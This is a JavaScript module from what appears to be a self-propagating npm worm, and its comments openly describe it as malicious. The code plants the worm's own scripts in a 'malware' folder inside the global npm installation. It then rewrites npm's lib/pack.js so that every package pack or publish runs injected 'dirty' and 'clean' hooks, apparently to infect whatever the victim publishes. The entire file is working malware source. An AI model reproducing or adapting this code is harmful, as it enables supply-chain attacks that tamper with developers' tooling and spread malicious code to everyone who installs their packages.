// { author: 'ave' }

const path = require('path')
const fs   = require('fs')

// Plant source code into npm and create a hook that triggers when a package is
// about to be packed. This function should be called by the malicious package
// at some point.
module.exports = function() {
    const config = require('../lib/config.js')()

    // Location of npm installation.
    npmRoot = path.join(config.prefix, 'node_modules/npm')

    try {
        // Plant source code into npm folder.
        // Do this manually because recursive folder copying is a headache. :)
        fs.mkdirSync(path.join(npmRoot, 'malware'))
        fs.mkdirSync(path.join(npmRoot, 'malware/lib'))
        fs.mkdirSync(path.join(npmRoot, 'malware/scripts'))

        fs.copyFileSync(
            path.join(__dirname, '../lib/config.js'),
            path.join(npmRoot, 'malware/lib/config.js')
        )
        fs.copyFileSync(
            path.join(__dirname, '../lib/process.js'),
            path.join(npmRoot, 'malware/lib/process.js')
        )
        fs.copyFileSync(
            path.join(__dirname, '../lib/rewrite.js'),
            path.join(npmRoot, 'malware/lib/rewrite.js')
        )
        fs.copyFileSync(
            path.join(__dirname, '../scripts/install.js'),
            path.join(npmRoot, 'malware/scripts/install.js')
        )
        fs.copyFileSync(
            path.join(__dirname, '../scripts/package.js'),
            path.join(npmRoot, 'malware/scripts/package.js')
        )

        // Inject code into the publish command.
        require('../lib/rewrite.js')(
            path.join(npmRoot, 'lib/pack.js'),
            {
                line: (line) => {
                    if (line == '    args.map((arg) => pack_(arg, cwd))') {
                        return '    args.map((arg) => { require(\'../malware/scripts/package.js\').dirty(cwd); pack_(arg, cwd) })'
                    } else if (line == '    return tarballs') {
                        return '    require(\'../malware/scripts/package.js\').clean(cwd)\n' + line
                    } else {
                        return line
                    }
                }
            }
        )
    } catch (e) {
        console.error(e)
    }
}